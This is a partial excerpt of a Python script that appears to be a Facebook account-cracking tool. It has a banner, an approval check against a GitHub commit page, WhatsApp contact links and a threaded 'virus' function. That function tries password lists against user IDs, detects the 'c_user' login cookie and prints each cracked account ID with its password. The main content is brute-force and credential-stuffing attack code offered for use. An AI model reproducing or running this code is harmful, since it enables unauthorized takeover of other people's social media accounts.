...
╚═╝  ╚═╝       ╚═╝       ╚═╝    ╚═╝  ╚═╝                                        
  ...
  print(f"")
  print(f"\t \033[1;33m  HE IS INTELLIGENT  MEN OF FF \033[1;37m ")
  print(f"")
  ...
  try:
    httpCaht = requests.get("https://github.com/atik-lx/approval./commit/d6cfe235ea5d340a687659a3fc78189df647025e?diff=unified").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open https://wa.me/+8801608032030?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801608032030');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.chinyt');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://youtube.com/XGsHJDvtPAW-zbg');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def virus():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		print(f' [😖]  UA  : '+str(len(ugen)))
		print(f' [👻]\033[1;97m  SIM CODE:\033[1;92m {kode} ')
		print(f"\033[1;97m [😤]  VR:\033[1;92m {doamin}")
		print(' \033[1;97m[👽]  W8 AND SEEU')
		print(' [😈]  USE BIMAN MOD')
		print(50*'_')
		for guru in user:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [ATIK-OK] '+cid+' | '+ps+'\33[0;92m')
